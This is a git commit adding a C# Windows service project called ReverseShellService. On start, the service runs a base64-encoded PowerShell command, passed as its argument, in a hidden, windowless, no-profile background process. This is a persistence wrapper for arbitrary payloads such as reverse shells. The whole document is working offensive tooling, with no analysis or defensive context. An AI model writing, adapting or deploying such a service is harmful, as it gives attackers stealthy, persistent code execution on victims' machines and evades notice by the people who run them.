75b9be7348e522c681e6a2046b72a39e5235983c
jonat <jonat@TESTBOX>
2025-09-23 11:50:06 -0700

    Add project files.

---
+++ ReverseShellService/Program.cs
@@ -0,0 +1,17 @@
+﻿using System.ServiceProcess;
+
+namespace ReverseShellService
+{
+    internal static class Program
+    {
+        static void Main(string[] args)
+        {
+            ServiceBase[] ServicesToRun;
+            ServicesToRun = new ServiceBase[]
+            {
+                new ReverseShellService(args)
+            };
+            ServiceBase.Run(ServicesToRun);
+        }
+    }
+}
---
+++ ReverseShellService/ReverseShellService.cs
@@ -0,0 +1,60 @@
+﻿using System.Diagnostics;
+using System.ServiceProcess;
+using System.Threading;
+
+namespace ReverseShellService
+{
+    public partial class ReverseShellService : ServiceBase
+    {
+        private readonly string[] autoArgs;
+        private Thread thread;
+
+        public ReverseShellService(string[] autoArgs)
+        {
+            InitializeComponent();
+
+            this.autoArgs = autoArgs;
+        }
+
+        protected override void OnStart(string[] _)
+        {
+            var encodedCommand = (autoArgs.Length > 0 && !string.IsNullOrEmpty(autoArgs[0]))
+                ? autoArgs[0]
+                : null;
+
+            if(string.IsNullOrEmpty(encodedCommand))
+            {
+                Stop();
+                return;
+            }
+
+            thread = new Thread(() => RunEncodedPowerShell(encodedCommand))
+            {
+                IsBackground = true
+            };
+
+            thread.Start();
+        }
+
+        private void RunEncodedPowerShell(string encoded)
+        {
+            var psi = new ProcessStartInfo
+            {
+                FileName = "powershell.exe",
+                Arguments = $"-nop -w hidden -enc {encoded}",
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            using (var proc = Process.Start(psi)) { proc.WaitForExit(); }
+        }
+
+        protected override void OnStop()
+        {
+            if(thread.IsAlive)
+            {
+                thread.Abort();
+            }
+        }
+    }
+}
